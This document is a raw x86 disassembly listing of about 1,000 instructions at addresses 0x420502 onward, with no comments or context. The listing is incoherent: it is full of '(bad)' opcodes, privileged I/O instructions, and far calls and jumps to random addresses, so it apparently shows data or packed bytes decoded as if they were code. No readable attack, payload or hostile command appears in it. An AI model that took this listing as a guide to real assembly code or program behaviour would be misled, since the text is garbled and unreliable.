  420502:	mov    esp,0xe6e9cc8
  420507:	in     eax,0x2d
  420509:	(bad)  
  42050a:	dec    edi
  42050b:	dec    ebx
  42050c:	popf   
  42050d:	mov    eax,ecx
  42050f:	test   BYTE PTR ds:0x1b4f84d6,bl
  420515:	add    ecx,0x14
  420518:	call   0xf164:0x142eaab3
  42051f:	jp     0x4204bc
  420521:	lds    esp,FWORD PTR ds:0x5cb4fd3e
  420527:	sub    DWORD PTR [ebx-0x1a],eax
  42052a:	xlat   BYTE PTR ds:[ebx]
  42052b:	shl    DWORD PTR [eax-0x631cc33e],1
  420531:	mov    esi,0x41a12ad4
  420536:	cs jo  0x42058b
  420539:	push   eax
  42053a:	loope  0x4205a6
  42053c:	jmp    0x420540
  42053e:	jl     0x4205b4
  420540:	cmp    DWORD PTR [ebx+0x6f],edx
  420543:	in     al,0x90
  420545:	jmp    0x6f801797
  42054a:	mov    eax,ds:0xb73846e8
  42054f:	and    al,0x25
  420551:	enter  0x50e0,0xe7
  420555:	dec    esp
  420556:	mov    bl,0x8e
  420558:	es loope 0x4204e4
  42055b:	mov    bl,0x74
  42055d:	daa    
  42055e:	cmp    DWORD PTR [ecx+0x27],edi
  420561:	icebp  
  420562:	cmp    DWORD PTR [edi+0x66a44aa0],eax
  420568:	inc    ecx
  420569:	jno    0x4204ec
  42056b:	push   eax
  42056c:	loop   0x4205c0
  42056e:	mov    dh,0xb0
  420570:	push   ebx
  420571:	imul   esi,DWORD PTR [edi],0x5d
  420574:	inc    ebx
  420575:	or     dl,ch
  420577:	jb     0x420502
  420579:	jp     0x42054e
  42057b:	dec    esp
  42057c:	popf   
  42057d:	jbe    0x42051a
  42057f:	ss push esp
  420581:	das    
  420582:	fcom   QWORD PTR [eax+0x2bf74ede]
  420588:	daa    
  420589:	repnz ror BYTE PTR [ecx+0x385c3c3a],0xfa
  420591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420592:	jae    0x420573
  420594:	sbb    al,0x1
  420596:	(bad)  [ebx]
  420598:	out    dx,eax
  420599:	mov    fs,WORD PTR [eax-0x4c]
  42059c:	mov    ebp,0xf8689103
  4205a1:	pop    edx
  4205a2:	inc    edi
  4205a3:	ds or  eax,0x76aefe19
  4205a9:	jb     0x420553
  4205ab:	(bad)  
  4205ac:	fdivr  DWORD PTR [edi+0x6fa8cc63]
  4205b2:	fdivr  DWORD PTR [esi+0x54aaa410]
  4205b8:	sub    al,0x93
  4205ba:	mov    bh,0x58
  4205bc:	jo     0x420599
  4205be:	sbb    cl,BYTE PTR ss:[ebp-0x4e]
  4205c2:	and    eax,0x16eb854c
  4205c7:	or     DWORD PTR [ecx],0x9fa266f1
  4205cd:	mov    eax,0x420338d8
  4205d2:	sbb    BYTE PTR [ecx-0x54f7f9ac],dl
  4205d8:	pop    esi
  4205d9:	sar    DWORD PTR ss:[eax-0x39],1
  4205dd:	push   eax
  4205de:	push   eax
  4205df:	sbb    eax,0x7335d5bf
  4205e4:	dec    ecx
  4205e5:	or     BYTE PTR [ebp-0x75b18dae],dh
  4205eb:	mov    esi,0xc8c483d3
  4205f0:	and    BYTE PTR [eax+0xa],ch
  4205f3:	pop    ss
  4205f4:	pop    ds
  4205f5:	push   esp
  4205f6:	inc    eax
  4205f7:	fist   WORD PTR [ebp+esi*8+0x1f]
  4205fb:	fisttp QWORD PTR ds:0x5d35c5ce
  420601:	jl     0x4205d2
  420603:	jmp    0xc7f89ef7
  420608:	scas   eax,DWORD PTR es:[edi]
  420609:	xchg   ebx,eax
  42060a:	ja     0x420682
  42060c:	or     DWORD PTR [ebp+0x15],eax
  42060f:	js     0x420639
  420611:	rcl    BYTE PTR ds:0xa572da22,0xad
  420618:	loopne 0x420609
  42061a:	xor    al,0x76
  42061c:	ja     0x420617
  42061e:	popa   
  42061f:	mov    cl,0x90
  420621:	xchg   ebp,eax
  420622:	xchg   BYTE PTR [ebx],dh
  420624:	stos   BYTE PTR es:[edi],al
  420625:	fs jge 0x420657
  420628:	fnsave [ecx]
  42062a:	daa    
  42062b:	rcr    BYTE PTR [edi],1
  42062d:	xchg   ah,ch
  42062f:	and    ah,BYTE PTR [ebp+0x79]
  420632:	retf   0xa295
  420635:	pushf  
  420636:	aam    0x47
  420638:	cs inc esp
  42063a:	test   al,0xee
  42063c:	push   0x9add31d8
  420641:	inc    ebp
  420642:	push   esp
  420643:	aas    
  420644:	push   ebx
  420645:	js     0x4205eb
  420647:	add    dh,BYTE PTR ds:0x472dbd5c
  42064d:	push   es
  42064e:	ins    BYTE PTR es:[edi],dx
  42064f:	pop    edi
  420650:	mov    BYTE PTR [eax+0x2ee656cf],dl
  420656:	imul   ecx,DWORD PTR [esp+eiz*4],0x15a9fe64
  42065d:	(bad)  [ebx+0x492b49d8]
  420663:	mov    ecx,0xedb92dbc
  420668:	push   ebx
  420669:	mov    bl,0xa7
  42066b:	jle    0x420626
  42066d:	and    ah,BYTE PTR ds:[ebx-0x30]
  420671:	mov    esi,0x7f1b0b91
  420676:	or     BYTE PTR [edx+0x60],al
  420679:	rol    eax,cl
  42067b:	xor    BYTE PTR [edi-0xa],ch
  42067e:	sub    al,0x65
  420680:	cwde   
  420681:	adc    DWORD PTR [ebx-0x1966f13f],eax
  420687:	inc    edi
  420688:	sbb    eax,0xd1b4c93c
  42068d:	not    BYTE PTR [esi]
  42068f:	or     dl,dh
  420691:	cmc    
  420692:	fcom   DWORD PTR [esi+0x703f7680]
  420698:	xor    al,0xe9
  42069a:	scas   eax,DWORD PTR es:[edi]
  42069b:	neg    BYTE PTR [ecx]
  42069d:	stos   BYTE PTR es:[edi],al
  42069e:	(bad)  
  42069f:	fcmove st,st(7)
  4206a1:	icebp  
  4206a2:	mov    eax,ds:0x22eed76c
  4206a7:	pop    esp
  4206a8:	jne    0x42068b
  4206aa:	push   eax
  4206ab:	lock pop ds
  4206ad:	pop    edx
  4206ae:	push   ss
  4206af:	dec    DWORD PTR [edx+0x79]
  4206b2:	add    ch,BYTE PTR [ecx-0x565a0605]
  4206b8:	in     eax,0x86
  4206ba:	push   ds
  4206bb:	mov    dh,0x2a
  4206bd:	js     0x4206de
  4206bf:	(bad)  
  4206c0:	hlt    
  4206c1:	lea    esp,[esi+0x1d]
  4206c4:	shl    DWORD PTR [edx],0x2
  4206c7:	ins    DWORD PTR es:[edi],dx
  4206c8:	xlat   BYTE PTR ds:[ebx]
  4206c9:	ss into 
  4206cb:	mov    eax,ds:0xc2a7213e
  4206d0:	inc    esi
  4206d1:	and    DWORD PTR [eax+0x4a36fca2],ebp
  4206d7:	lea    esi,[edx-0x72]
  4206da:	rcl    BYTE PTR [edi+0x4f],cl
  4206dd:	retf   
  4206de:	call   0x296ce42a
  4206e3:	push   ebx
  4206e4:	clc    
  4206e5:	xor    al,0x91
  4206e7:	outs   dx,BYTE PTR ds:[esi]
  4206e8:	call   0x4790d419
  4206ed:	out    0x25,eax
  4206ef:	jo     0x4206f5
  4206f1:	add    edi,DWORD PTR [esi-0x26]
  4206f4:	stos   BYTE PTR es:[edi],al
  4206f5:	rol    BYTE PTR ds:0xecd48880,cl
  4206fb:	mov    dh,0xda
  4206fd:	int    0xe7
  4206ff:	cmp    al,cl
  420701:	sbb    esp,DWORD PTR [ecx+0x4442bef6]
  420707:	xchg   edi,eax
  420708:	dec    edx
  420709:	sbb    DWORD PTR [edi+0x70],edi
  42070c:	nop
  42070d:	dec    eax
  42070e:	mov    eax,ds:0x57abab0b
  420713:	xchg   DWORD PTR [ecx+0x511c4f58],ebx
  420719:	jo     0x4206e7
  42071b:	cli    
  42071c:	sub    bh,bh
  42071e:	or     eax,0xae104bb7
  420723:	pop    ss
  420724:	push   ecx
  420725:	jbe    0x4206d4
  420727:	mov    DWORD PTR [edx-0x31af2bfe],edi
  42072d:	icebp  
  42072e:	cmc    
  42072f:	mov    al,ds:0xb9a32eab
  420734:	mov    bl,0xd4
  420736:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420737:	jecxz  0x4206c2
  420739:	cdq    
  42073a:	cli    
  42073b:	ret    0x9c52
  42073e:	dec    ecx
  42073f:	loopne 0x420767
  420741:	adc    eax,0xe539f9bc
  420746:	sbb    dh,dl
  420748:	xchg   ebp,eax
  420749:	xchg   ebx,eax
  42074a:	or     DWORD PTR [ebx],edi
  42074c:	push   esp
  42074d:	pop    ss
  42074e:	jge    0x42077b
  420750:	outs   dx,DWORD PTR ds:[esi]
  420751:	lds    esi,FWORD PTR [edx+0x10]
  420754:	jl     0x42078b
  420756:	cld    
  420757:	test   DWORD PTR [esi+0x230fa31d],ecx
  42075d:	cmp    DWORD PTR [edi+0x67860142],edx
  420763:	mov    eax,ds:0x886eb755
  420768:	daa    
  420769:	sbb    eax,0xed54b6c8
  42076e:	mov    bl,BYTE PTR [ebx]
  420770:	jbe    0x4207af
  420772:	test   ecx,0xf982aa49
  420778:	and    esi,edx
  42077a:	jb     0x420745
  42077c:	push   ecx
  42077d:	cmp    bh,BYTE PTR [ebp+0x0]
  420780:	aam    0x90
  420782:	jne    0x420721
  420784:	or     eax,0x7d67a892
  420789:	pop    es
  42078a:	fldenv [edi-0x55cf49b3]
  420790:	sbb    eax,0x1d1c6930
  420795:	fcomp  QWORD PTR [edx+edx*2]
  420798:	mov    BYTE PTR [edi],ch
  42079a:	leave  
  42079b:	mov    ecx,DWORD PTR [ebx-0x5e]
  42079e:	cmp    BYTE PTR [ecx+eax*8-0x5a],al
  4207a2:	jne    0x420794
  4207a4:	lods   eax,DWORD PTR ds:[esi]
  4207a5:	ins    DWORD PTR es:[edi],dx
  4207a6:	dec    eax
  4207a7:	daa    
  4207a8:	pop    edi
  4207a9:	mov    DWORD PTR [edi+0x58486943],esi
  4207af:	inc    eax
  4207b0:	aad    0x28
  4207b2:	and    al,0x61
  4207b4:	sub    eax,0xf54d8494
  4207b9:	mov    dl,0xe1
  4207bb:	stos   BYTE PTR es:[edi],al
  4207bc:	and    al,0x24
  4207be:	mul    BYTE PTR [eax-0x1]
  4207c1:	cwde   
  4207c2:	jecxz  0x420823
  4207c4:	xchg   edi,eax
  4207c5:	outs   dx,BYTE PTR ds:[esi]
  4207c6:	inc    edx
  4207c7:	addr16 xor ch,dl
  4207ca:	ja     0x420846
  4207cc:	jl     0x42082c
  4207ce:	and    BYTE PTR cs:[eax-0x5f],dl
  4207d2:	push   edi
  4207d3:	or     eax,0x4011720f
  4207d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207d9:	sbb    ebp,DWORD PTR [ebx]
  4207db:	xor    ecx,edx
  4207dd:	dec    ebp
  4207de:	sub    al,BYTE PTR [ecx+0x3b]
  4207e1:	ins    BYTE PTR es:[edi],dx
  4207e2:	fnstenv es:[edx+0x4f]
  4207e6:	add    eax,edx
  4207e8:	imul   eax,DWORD PTR [edx-0x2c0f3966],0xf7eff4dc
  4207f2:	xor    eax,0xb43f63e1
  4207f7:	xor    BYTE PTR [ecx-0x278ce1c6],0xe1
  4207fe:	loope  0x42086a
  420800:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420801:	fisubr DWORD PTR [ecx+0x51]
  420804:	retf   0x77dd
  420807:	je     0x420808
  420809:	ja     0x420852
  42080b:	aaa    
  42080c:	xchg   esi,eax
  42080d:	mov    ebp,ecx
  42080f:	idiv   BYTE PTR [edx+0x3d7db690]
  420815:	loope  0x4207e1
  420817:	stos   BYTE PTR es:[edi],al
  420818:	push   ebx
  420819:	ins    BYTE PTR es:[edi],dx
  42081a:	ret    0xa8a
  42081d:	pop    ecx
  42081e:	retf   0x3cac
  420821:	cmp    edx,DWORD PTR [ebx+0x3a3e8153]
  420827:	adc    al,BYTE PTR [edx-0x7d68b884]
  42082d:	inc    ebx
  42082e:	mov    ds:0x702a2e12,eax
  420833:	cmp    al,0xd6
  420835:	into   
  420836:	and    bl,BYTE PTR [edi+0x38f7d5e5]
  42083c:	xchg   esi,eax
  42083d:	push   0x1e27b4f1
  420842:	fiadd  WORD PTR [esi]
  420844:	fstp   QWORD PTR [esi]
  420846:	xlat   BYTE PTR ds:[ebx]
  420847:	push   edx
  420848:	adc    al,0x6a
  42084a:	cmp    edi,ebp
  42084c:	jne    0x420805
  42084e:	fidivr DWORD PTR [edi]
  420850:	sti    
  420851:	mov    cl,0xe4
  420853:	(bad)  
  420854:	je     0x4207f6
  420856:	sbb    ebx,edi
  420858:	and    ecx,DWORD PTR [edx-0xf]
  42085b:	int3   
  42085c:	mov    ds:0xc38e2a62,eax
  420861:	(bad)  
  420862:	iret   
  420863:	out    0x5c,eax
  420865:	adc    ebx,DWORD PTR [esi+edi*2]
  420868:	sbb    DWORD PTR [edx-0x6c],0x6b
  42086c:	fcom   st(1)
  42086e:	and    al,0x26
  420870:	mov    ebx,fs
  420872:	jbe    0x4208d5
  420874:	rcl    BYTE PTR [esi+0x28351057],0x7f
  42087b:	mov    edi,0xc08ab5ba
  420880:	nop
  420881:	int3   
  420882:	mov    dl,0x2d
  420884:	es pushf 
  420886:	ds ins BYTE PTR es:[edi],dx
  420888:	mov    eax,0x66d2b309
  42088d:	jp     0x42084e
  42088f:	into   
  420890:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420891:	bound  eax,QWORD PTR [ebx]
  420893:	fcom   DWORD PTR [ecx]
  420895:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420896:	push   edi
  420897:	push   esi
  420898:	lods   al,BYTE PTR ds:[esi]
  420899:	mov    ch,BYTE PTR [eax-0x7b]
  42089c:	sbb    eax,0x1e64326e
  4208a1:	aad    0x5f
  4208a3:	je     0x420885
  4208a5:	adc    cl,BYTE PTR [edx]
  4208a7:	daa    
  4208a8:	je     0x42090f
  4208aa:	dec    ecx
  4208ab:	fwait
  4208ac:	sub    al,0xa9
  4208ae:	sbb    eax,0xf883b6be
  4208b3:	push   edx
  4208b4:	pushf  
  4208b5:	add    eax,0x8b22bf55
  4208ba:	xchg   ecx,eax
  4208bb:	push   ss
  4208bc:	jg     0x4208e7
  4208be:	fwait
  4208bf:	push   ss
  4208c0:	sub    BYTE PTR [eax+eax*8+0x13],dl
  4208c4:	adc    al,0x7
  4208c6:	test   DWORD PTR [edi],esi
  4208c8:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4208ca:	mov    esp,0x8554ee14
  4208cf:	jnp    0x4208b6
  4208d1:	(bad)  
  4208d2:	jecxz  0x4208c9
  4208d4:	daa    
  4208d5:	mov    eax,ds:0xb6a43f8e
  4208da:	dec    ebp
  4208db:	dec    edi
  4208dc:	aam    0xdb
  4208de:	sub    eax,0x7b04da6
  4208e3:	les    esi,FWORD PTR [ebx+0x643247d7]
  4208e9:	add    BYTE PTR [edi-0x3a],ch
  4208ec:	mov    esi,esp
  4208ee:	sar    dl,cl
  4208f0:	(bad)  
  4208f1:	xchg   ebp,eax
  4208f2:	test   eax,0x6df0ebf3
  4208f7:	aad    0x4e
  4208f9:	jnp    0x4208cb
  4208fb:	sbb    ebp,DWORD PTR [eax]
  4208fd:	xor    bh,dl
  4208ff:	dec    esp
  420900:	add    ch,ah
  420902:	repnz hlt 
  420904:	jge    0x4208f1
  420906:	cdq    
  420907:	push   ss
  420908:	ins    DWORD PTR es:[edi],dx
  420909:	lock stos DWORD PTR es:[edi],eax
  42090b:	imul   esi,DWORD PTR [eiz*8-0x398a28ef],0x12
  420913:	mov    ah,0x18
  420915:	sbb    bh,BYTE PTR [eax-0x65f63b67]
  42091b:	sub    cl,BYTE PTR ds:0xdb6bbd07
  420921:	bound  edx,QWORD PTR [ebp-0x7c16a505]
  420927:	out    dx,eax
  420928:	retf   
  420929:	lds    ebx,FWORD PTR [ebp-0x28f32da4]
  42092f:	mov    bh,dl
  420931:	pop    ebp
  420932:	sub    DWORD PTR [eax-0x206a33a],0x19
  420939:	iret   
  42093a:	ja     0x420925
  42093c:	mov    cl,0x53
  42093e:	add    DWORD PTR [edi+edi*4-0x10fda60c],edi
  420945:	cli    
  420946:	jle    0x4209a9
  420948:	pmaddwd mm1,QWORD PTR [esp+ebx*8]
  42094c:	je     0x420906
  42094e:	fndisi(8087 only) 
  420950:	in     al,dx
  420951:	cs jno 0x4209b9
  420954:	aaa    
  420955:	lock in eax,dx
  420957:	mov    al,0x33
  420959:	out    0xd0,eax
  42095b:	fwait
  42095c:	jmp    0xaf709bb7
  420961:	ds jmp 0xdd2a:0xcd2b78fd
  420969:	neg    DWORD PTR [ecx-0x16]
  42096c:	mov    ds:0x5682bb84,al
  420971:	jb     0x420943
  420973:	xchg   edi,eax
  420974:	xchg   DWORD PTR [ebp-0x5d],esi
  420977:	mov    ah,0x8d
  420979:	loope  0x420958
  42097b:	jbe    0x420986
  42097d:	inc    edi
  42097e:	pop    ecx
  42097f:	xacquire xchg DWORD PTR [ebx+0xd],ebp
  420983:	in     al,0x5b
  420985:	loope  0x420974
  420987:	imul   eax,DWORD PTR [esi-0x44a1ab31],0x6a4c16ca
  420991:	(bad)  
  420993:	arpl   WORD PTR [ecx+esi*1],dx
  420996:	cs or  al,0x2c
  420999:	test   BYTE PTR [ebx],al
  42099b:	pcmpgtd mm6,QWORD PTR [ecx]
  42099e:	je     0x4209db
  4209a0:	stc    
  4209a1:	daa    
  4209a2:	push   es
  4209a3:	jb     0x4209fa
  4209a5:	sub    esi,DWORD PTR [esi]
  4209a7:	shl    DWORD PTR [ebx-0x6c25e7b1],cl
  4209ad:	ror    esp,cl
  4209af:	cwde   
  4209b0:	inc    eax
  4209b1:	jns    0x420a0f
  4209b3:	inc    edi
  4209b4:	jp     0x4209a1
  4209b6:	in     eax,0x78
  4209b8:	pop    ss
  4209b9:	ret    0xe995
  4209bc:	imul   edi,DWORD PTR [edi],0xfffffff8
  4209bf:	test   DWORD PTR [esi+0x83c3d1e],ebx
  4209c5:	inc    ebp
  4209c6:	lahf   
  4209c7:	out    dx,eax
  4209c8:	dec    edi
  4209c9:	adc    esi,ebp
  4209cb:	mov    al,ds:0xabbd9d42
  4209d0:	into   
  4209d1:	cdq    
  4209d2:	and    eax,0x1c26cf56
  4209d7:	sub    BYTE PTR [eax+0x22c4d442],bh
  4209dd:	daa    
  4209de:	loope  0x420a12
  4209e0:	pop    eax
  4209e1:	dec    eax
  4209e2:	add    dl,BYTE PTR [edx+0x1d8eab09]
  4209e8:	mov    ecx,0xcfa48c13
  4209ed:	or     eax,0xcbb7875b
  4209f2:	and    al,0xec
  4209f4:	push   cs
  4209f5:	aas    
  4209f6:	add    al,BYTE PTR [ebx-0x23]
  4209f9:	(bad)  
  4209fb:	loop   0x420a0b
  4209fd:	xor    BYTE PTR [ebp-0x7b],al
  420a00:	or     eax,0x8d0de294
  420a05:	test   DWORD PTR [edi],ebp
  420a07:	or     al,BYTE PTR [edi+0x261e923e]
  420a0d:	les    esp,FWORD PTR [ebx-0xf]
  420a10:	cmp    edx,DWORD PTR [edx]
  420a12:	repnz or bl,al
  420a15:	fs shl edi,0x43
  420a19:	shl    ch,cl
  420a1b:	jne    0x420a07
  420a1d:	adc    al,0xd2
  420a1f:	ja     0x4209c7
  420a21:	or     al,0xbb
  420a23:	xchg   ecx,eax
  420a24:	(bad)  
  420a25:	not    bh
  420a27:	fidiv  WORD PTR [eax-0x3]
  420a2a:	push   esi
  420a2b:	sti    
  420a2c:	pop    esi
  420a2d:	dec    edx
  420a2e:	push   ecx
  420a2f:	test   eax,0xe38c280e
  420a34:	xchg   ebp,eax
  420a35:	sub    eax,0xdc9d8786
  420a3a:	and    BYTE PTR ss:[eax-0x72f26992],ch
  420a41:	das    
  420a42:	mov    dl,0x1c
  420a44:	jg     0x4209f1
  420a46:	adc    ah,bl
  420a48:	scas   eax,DWORD PTR es:[edi]
  420a49:	sub    DWORD PTR [ebx-0x61],ecx
  420a4c:	push   0xf9af8182
  420a51:	and    al,BYTE PTR [edi-0x121a179d]
  420a57:	repnz repnz stos DWORD PTR es:[edi],eax
  420a5a:	ins    BYTE PTR es:[edi],dx
  420a5b:	jl     0x420a4b
  420a5d:	out    dx,eax
  420a5e:	je     0x420a2f
  420a60:	mov    al,ds:0xdb164461
  420a65:	sbb    BYTE PTR [ecx-0x71f0ab9b],bl
  420a6b:	and    BYTE PTR [ebx+0x44],cl
  420a6e:	xor    al,0x4e
  420a70:	push   ecx
  420a71:	jg     0x420a09
  420a73:	sub    eax,DWORD PTR [edx+0x5a]
  420a76:	inc    edx
  420a77:	fcomip st,st(1)
  420a79:	xor    eax,0x123d7347
  420a7e:	adc    BYTE PTR [ecx+0x62],dl
  420a81:	and    al,0xab
  420a83:	sbb    edx,eax
  420a85:	lock cmc 
  420a87:	sbb    DWORD PTR [ecx],ebp
  420a89:	sti    
  420a8a:	je     0x420a32
  420a8c:	data16 clc 
  420a8e:	ret    0x330e
  420a91:	call   0xda235631
  420a96:	sub    al,0x48
  420a98:	outs   dx,DWORD PTR ds:[esi]
  420a99:	cmp    ebx,DWORD PTR [esp+eiz*4]
  420a9c:	cmp    BYTE PTR ds:0x49458bb5,ah
  420aa2:	sub    BYTE PTR [ebx-0x7262c9ec],0xe2
  420aa9:	imul   ebp,DWORD PTR [esp+edi*1+0x3e7620ec],0x2b145a4a
  420ab4:	jg     0x420ada
  420ab6:	sbb    al,0xb0
  420ab8:	jg     0x420ab6
  420aba:	adc    bl,dh
  420abc:	jnp    0x420abc
  420abe:	jge    0x420a7a
  420ac0:	fst    DWORD PTR [eax-0x27]
  420ac3:	and    al,0x22
  420ac5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ac6:	or     al,0xbb
  420ac8:	jb     0x420ac8
  420aca:	sub    ebp,DWORD PTR [ebx-0x38]
  420acd:	lods   eax,DWORD PTR ds:[esi]
  420ace:	hlt    
  420acf:	jae    0x420a5d
  420ad1:	pushf  
  420ad2:	mov    BYTE PTR [ebp+0x23ba7007],bh
  420ad8:	xlat   BYTE PTR ds:[ebx]
  420ad9:	push   cs
  420ada:	pop    ebx
  420adb:	mov    BYTE PTR [edi],bh
  420add:	add    ebx,DWORD PTR [esi-0x526210e4]
  420ae3:	icebp  
  420ae4:	addr16 dec ebp
  420ae6:	bound  esp,QWORD PTR [ebp+0x3a28bfb8]
  420aec:	ds push cs
  420aee:	and    al,0x2a
  420af0:	jecxz  0x420acb
  420af2:	enter  0x634a,0xe7
  420af6:	sub    ch,BYTE PTR [edx]
  420af8:	adc    esi,DWORD PTR [eax-0x77]
  420afb:	xlat   BYTE PTR ds:[ebx]
  420afc:	mov    BYTE PTR [ebx],ch
  420afe:	mov    cl,0x1a
  420b00:	pop    esi
  420b01:	add    bh,BYTE PTR [edx+0x73]
  420b04:	mov    ?,esp
  420b06:	pop    ebx
  420b07:	jl     0x420ae7
  420b09:	jae    0x420ad6
  420b0b:	bound  edi,QWORD PTR [ebp+ecx*2+0x16]
  420b0f:	mov    ds:0xf73f922,al
  420b14:	leave  
  420b15:	ret    
  420b16:	stos   BYTE PTR es:[edi],al
  420b17:	jecxz  0x420b6e
  420b19:	xchg   ebp,eax
  420b1a:	pop    es
  420b1b:	fcomp  st(3)
  420b1d:	inc    esp
  420b1e:	xor    DWORD PTR [esi+0x3f941300],edi
  420b24:	loop   0x420b80
  420b26:	mov    al,ds:0x85812eba
  420b2b:	in     al,dx
  420b2c:	mov    ch,0x13
  420b2e:	in     eax,dx
  420b2f:	inc    edi
  420b30:	push   0x7d
  420b32:	stos   DWORD PTR es:[edi],eax
  420b33:	icebp  
  420b34:	out    0x72,eax
  420b36:	fist   DWORD PTR [esi+0x2957f4f8]
  420b3c:	mov    cl,0x88
  420b3e:	mov    al,BYTE PTR [esp+edi*1+0x313311c4]
  420b45:	or     BYTE PTR [edi+0x5d07c975],dl
  420b4b:	sub    eax,0x7556478a
  420b50:	mov    ah,0xfc
  420b52:	or     eax,0xc86c6944
  420b57:	push   ecx
  420b58:	lods   al,BYTE PTR ds:[esi]
  420b59:	jo     0x420afb
  420b5b:	xchg   ebx,eax
  420b5c:	dec    edx
  420b5d:	add    bh,BYTE PTR [eax+0x5a]
  420b60:	inc    ebp
  420b61:	xchg   ebx,eax
  420b62:	sbb    BYTE PTR [edx],0xa4
  420b65:	cmp    DWORD PTR [eax],eax
  420b67:	mov    bh,0x62
  420b69:	retf   
  420b6a:	sti    
  420b6b:	add    eax,0x916e8ce6
  420b70:	mov    edi,0x32c4400b
  420b75:	push   eax
  420b76:	ror    ecx,cl
  420b78:	pop    esi
  420b79:	dec    esp
  420b7a:	cwde   
  420b7b:	gs dec ebp
  420b7d:	(bad)  
  420b7e:	cld    
  420b7f:	ret    0xddd8
  420b82:	iret   
  420b83:	repnz sub eax,0x468885ea
  420b89:	push   edi
  420b8a:	dec    eax
  420b8b:	or     al,0xcf
  420b8d:	fild   DWORD PTR [esi+0x1ab98eda]
  420b93:	ds inc eax
  420b95:	jmp    0x6d7f:0xd7c09bf8
  420b9c:	jmp    0x112be756
  420ba1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ba2:	inc    esi
  420ba3:	fs mov eax,ebp
  420ba6:	leave  
  420ba7:	sub    edi,0x995774fe
  420bad:	out    0x56,al
  420baf:	push   ebp
  420bb0:	ret    
  420bb1:	outs   dx,BYTE PTR ds:[esi]
  420bb2:	pop    edi
  420bb3:	sub    DWORD PTR [edx+0x5f],ebp
  420bb6:	and    dl,cl
  420bb8:	jmp    0x420bca
  420bba:	popf   
  420bbb:	fsubp  st(4),st
  420bbd:	call   0xa4e6:0xba4426ea
  420bc4:	ret    0x5430
  420bc7:	rcl    DWORD PTR [edi-0x4b543487],cl
  420bcd:	inc    edx
  420bce:	mov    esp,0xb6c65227
  420bd3:	jbe    0x420c1f
  420bd5:	mov    eax,0x5a5a1cd9
  420bda:	push   edx
  420bdb:	fmul   QWORD PTR [eax]
  420bdd:	out    dx,al
  420bde:	daa    
  420bdf:	imul   edi,ebp,0xe7dbf6f1
  420be5:	dec    ebx
  420be6:	xchg   edx,eax
  420be7:	enter  0xb12,0xeb
  420beb:	mov    esp,0x4336b541
  420bf0:	push   eax
  420bf1:	mov    DWORD PTR [eax+0x704051ec],ecx
  420bf7:	test   eax,0x7b48b1c5
  420bfc:	mul    BYTE PTR [eax]
  420bfe:	dec    edx
  420bff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c00:	mov    ebp,0x89fd1144
  420c05:	cdq    
  420c06:	outs   dx,BYTE PTR ds:[esi]
  420c07:	mov    ebp,0xd463588b
  420c0c:	outs   dx,BYTE PTR ds:[esi]
  420c0d:	imul   esp,DWORD PTR [edx+0x6d00fe17],0x78
  420c14:	cmp    ch,dh
  420c16:	cmp    eax,0x1469e9e0
  420c1b:	jne    0x420c80
  420c1d:	jge    0x420c54
  420c1f:	push   es
  420c20:	push   edi
  420c21:	cdq    
  420c22:	adc    BYTE PTR [ecx-0x1c],0x21
  420c26:	outs   dx,DWORD PTR ds:[esi]
  420c27:	les    esp,FWORD PTR [ebx-0x35]
  420c2a:	or     al,0xf1
  420c2c:	add    BYTE PTR ds:0x3bcef15a,dl
  420c32:	xchg   cl,cl
  420c34:	lds    edi,FWORD PTR [esi+0x3f]
  420c37:	sbb    eax,0x33e26637
  420c3c:	popf   
  420c3d:	or     eax,0x4b78d3a
  420c42:	leave  
  420c43:	jb     0x420cba
  420c45:	sub    eax,DWORD PTR [ecx+0x67184fac]
  420c4b:	jo     0x420c0d
  420c4d:	dec    esi
  420c4e:	pop    ds
  420c4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c50:	dec    esi
  420c51:	pop    ecx
  420c52:	sub    eax,0x5e75bda0
  420c57:	imul   esi,DWORD PTR [ecx+0x19a9553e],0x4ebce874
  420c61:	dec    edx
  420c62:	sbb    bh,BYTE PTR [esi-0x34]
  420c65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c66:	inc    ebx
  420c67:	pop    ecx
  420c68:	jo     0x420cdf
  420c6a:	pop    eax
  420c6b:	adc    ch,cl
  420c6d:	ds dec ebx
  420c6f:	xchg   ebp,eax
  420c70:	and    ah,BYTE PTR [eax+0x52]
  420c73:	inc    esp
  420c74:	xor    edi,DWORD PTR [eax+0x476abd8d]
  420c7a:	jp     0x420c6e
  420c7c:	cli    
  420c7d:	mov    BYTE PTR [eax],dh
  420c7f:	mov    ebp,0xa44088a2
  420c84:	cld    
  420c85:	xchg   ecx,eax
  420c86:	sahf   
  420c87:	or     esi,esp
  420c89:	mov    dl,0x95
  420c8b:	xor    edi,DWORD PTR [edx+edx*1]
  420c8e:	ja     0x420c4c
  420c90:	pop    WORD PTR [edx-0x71]
  420c94:	lods   al,BYTE PTR ds:[esi]
  420c95:	cmc    
  420c96:	mov    gs,WORD PTR [ebp-0x2b]
  420c99:	jmp    0x920dce13
  420c9e:	xchg   esi,eax
  420c9f:	sub    al,0xf4
  420ca1:	sbb    DWORD PTR [esi],eax
  420ca3:	add    ebp,DWORD PTR [edx-0x107089]
  420ca9:	dec    edx
  420caa:	inc    esp
  420cab:	ja     0x420c50
  420cad:	xor    esi,ecx
  420caf:	(bad)  [ebx+ebx*4]
  420cb2:	aam    0x47
  420cb4:	(bad)  
  420cb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420cb6:	stos   DWORD PTR es:[edi],eax
  420cb7:	xor    eax,0x7bf74609
  420cbc:	push   ds
  420cbd:	enter  0x3220,0xc2
  420cc1:	outs   dx,DWORD PTR ds:[esi]
  420cc2:	dec    esi
  420cc3:	cdq    
  420cc4:	lods   al,BYTE PTR ds:[esi]
  420cc5:	je     0x420cc6
  420cc7:	out    dx,al
  420cc8:	or     BYTE PTR [esi+0x5ace570c],al
  420cce:	mov    eax,ebx
  420cd0:	mov    dl,0xa6
